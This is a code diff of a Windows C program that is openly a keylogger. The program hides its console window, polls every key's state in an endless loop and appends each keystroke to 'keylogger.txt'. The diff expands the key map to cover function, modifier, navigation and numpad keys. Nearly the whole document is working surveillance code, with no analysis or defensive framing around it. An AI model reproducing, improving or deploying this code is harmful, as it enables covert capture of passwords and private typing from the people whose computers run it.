@@ -2,74 +2,102 @@
 #include <stdio.h>
 #include <string.h>
 
-
-void save_to(const char *filename, const char *messsage){
-    FILE *fp;
-    fp = fopen(filename, "a");
-    if (fp == NULL) {
-        printf("Error opening file!\n");
-        return;
-    }
-    fprintf(fp, "%s", messsage);
+// Function to save a message to the file
+void save_to(const char *filename, const char *message) {
+    FILE *fp = fopen(filename, "a");
+    if (fp == NULL) return;
+    fprintf(fp, "%s", message);
     fclose(fp);
 }
 
-
-#include <io.h> // For _chsize
-#include <fcntl.h> // For fileno
-
-void removeLastCharacter(const char *filename) {
-    FILE *file = fopen(filename, "r+"); // Open the file in read-write mode
-    if (file == NULL) return;
-
-    fseek(file, 0, SEEK_END); // Move to the end of the file
-    long fileSize = ftell(file); // Get the current file size
-
-    if (fileSize == 0) { // If the file is empty, do nothing
-        fclose(file);
-        return;
-    }
-
-    fileSize--; // Reduce file size by one character
-    _chsize(_fileno(file), fileSize); // Truncate the file to the new size
-    fclose(file);
-}
 int main() {
     HWND hwnd = GetConsoleWindow();   // Get the console window handle
     ShowWindow(hwnd, SW_HIDE);        // Hide the window
 
+    char message[16]; // Buffer to hold the message
 
-    char *message = " ";
     while (1) {
         for (int i = 0; i < 256; i++) {
-            if(GetAsyncKeyState(0x08) & 1)removeLastCharacter("keylogger.txt");
-            if (GetAsyncKeyState(i) & 1) {
+            if (GetAsyncKeyState(i) & 0x0001) {  // Check if key is pressed
                 switch (i) {
-                    // case VK_BACK:
-                    //     removeLastCharacter("keylogger.txt");
-                    //     break;
-                    case VK_TAB:
-                        message = "\t";
+                    // Alphanumeric keys
+                    case 'A' ... 'Z':
+                    case '0' ... '9':
+                        snprintf(message, sizeof(message), "%c", i); // For alphanumeric characters
                         break;
-                    case VK_RETURN:
-                        message = "\n";
-                        break;
-                    case VK_SPACE:
-                        message = " ";
-                        break;
-                    default:
-                        if(i >= 65 && i <= 97){
-                            message = (char*)(&i); 
-                        } // Default for unsupported keys
-                        else message = "";
-                        break;
+
+                    // Function keys
+                    case VK_F1:  strcpy(message, "[F1]");  break;
+                    case VK_F2:  strcpy(message, "[F2]");  break;
+                    case VK_F3:  strcpy(message, "[F3]");  break;
+                    case VK_F4:  strcpy(message, "[F4]");  break;
+                    case VK_F5:  strcpy(message, "[F5]");  break;
+                    case VK_F6:  strcpy(message, "[F6]");  break;
+                    case VK_F7:  strcpy(message, "[F7]");  break;
+                    case VK_F8:  strcpy(message, "[F8]");  break;
+                    case VK_F9:  strcpy(message, "[F9]");  break;
+                    case VK_F10: strcpy(message, "[F10]"); break;
+                    case VK_F11: strcpy(message, "[F11]"); break;
+                    case VK_F12: strcpy(message, "[F12]"); break;
+
+                    // Modifier keys
+                    case VK_SHIFT:     strcpy(message, "[Shift]");     break;
+                    case VK_CONTROL:   strcpy(message, "[Ctrl]");      break;
+                    case VK_MENU:      strcpy(message, "[Alt]");       break;
+                    case VK_CAPITAL:   strcpy(message, "[CapsLock]");  break;
+                    case VK_NUMLOCK:   strcpy(message, "[NumLock]");   break;
+                    case VK_SCROLL:    strcpy(message, "[ScrollLock]"); break;
+
+                    // Navigation keys
+                    case VK_LEFT:      strcpy(message, "[Left]");      break;
+                    case VK_RIGHT:     strcpy(message, "[Right]");     break;
+                    case VK_UP:        strcpy(message, "[Up]");        break;
+                    case VK_DOWN:      strcpy(message, "[Down]");      break;
+                    case VK_HOME:      strcpy(message, "[Home]");      break;
+                    case VK_END:       strcpy(message, "[End]");       break;
+                    case VK_PRIOR:     strcpy(message, "[PageUp]");    break;
+                    case VK_NEXT:      strcpy(message, "[PageDown]");  break;
+                    case VK_INSERT:    strcpy(message, "[Insert]");    break;
+                    case VK_DELETE:    strcpy(message, "[Delete]");    break;
+
+                    // Special keys
+                    case VK_BACK:      strcpy(message, "[Backspace]"); break;
+                    case VK_TAB:       strcpy(message, "[Tab]");       break;
+                    case VK_RETURN:    strcpy(message, "[Enter]");     break;
+                    case VK_SPACE:     strcpy(message, " ");           break;
+                    case VK_ESCAPE:    strcpy(message, "[Escape]");    break;
+                    case VK_SNAPSHOT:  strcpy(message, "[PrintScreen]"); break;
+
+                    // Numpad keys
+                    case VK_NUMPAD0:   strcpy(message, "0");           break;
+                    case VK_NUMPAD1:   strcpy(message, "1");           break;
+                    case VK_NUMPAD2:   strcpy(message, "2");           break;
+                    case VK_NUMPAD3:   strcpy(message, "3");           break;
+                    case VK_NUMPAD4:   strcpy(message, "4");           break;
+                    case VK_NUMPAD5:   strcpy(message, "5");           break;
+                    case VK_NUMPAD6:   strcpy(message, "6");           break;
+                    case VK_NUMPAD7:   strcpy(message, "7");           break;
+                    case VK_NUMPAD8:   strcpy(message, "8");           break;
+                    case VK_NUMPAD9:   strcpy(message, "9");           break;
+                    case VK_ADD:       strcpy(message, "+");           break;
+                    case VK_SUBTRACT:  strcpy(message, "-");           break;
+                    case VK_MULTIPLY:  strcpy(message, "*");           break;
+                    case VK_DIVIDE:    strcpy(message, "/");           break;
+                    case VK_DECIMAL:   strcpy(message, ".");           break;
+
+                    // Windows keys
+                    case VK_LWIN:      strcpy(message, "[Left Windows]"); break;
+                    case VK_RWIN:      strcpy(message, "[Right Windows]"); break;
+
+                    // Unsupported keys
+                    default: strcpy(message, "[Unknown Key]"); break;
                 }
-                if(*message != '\0')save_to("keylogger.txt", message); // Log the key
+
+                save_to("keylogger.txt", message); // Save the message to the file
             }
         }
-        Sleep(1); // Reduce CPU usage
+        Sleep(10); // Reduce CPU usage
     }
-
 
     return 0;
 }
